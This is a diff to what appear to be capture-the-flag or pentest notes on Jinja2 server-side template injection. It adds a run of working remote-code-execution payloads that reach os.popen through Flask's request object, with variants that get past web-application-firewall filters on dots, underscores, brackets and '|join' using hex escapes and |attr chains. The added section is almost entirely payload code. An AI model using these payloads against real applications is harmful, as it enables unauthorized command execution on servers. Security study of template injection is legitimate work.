@@ -45,6 +45,22 @@ Jinja2 (Python):
 {{ "". __class__.__mro__ }}                         # prints method resolution order (tuple of classes)
 {{ "". __class__.__mro__[1].__subclasses__() }}     # lists subclasses (used for RCE)
 Source: https://www.youtube.com/watch?v=oVBkaSHj4aE
+
+Google: pyjail ssti https://onsecurity.io/article/server-side-template-injection-with-jinja2/
+---
+RCE bypassing as much as I possibly can.
+I initially built the following payload for remote command execution, and will now try and apply as many filter bypasses as I can.
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} 👀
+
+If the waf blocks ".":
+{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
+
+If the waf blocks "." and "_":
+{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}
+
+Bypassing the blocks on ".", "_", "[]" and "|join" makes the payload turn into this payload I made for PayloadAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings/pull/181/commits/7e7f5e762831266b22531c258d628172c7038bb9), also found on my twitter (https://twitter.com/SecGus/status/1249744031392940033):
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+---
 ```
 
 ## Solution
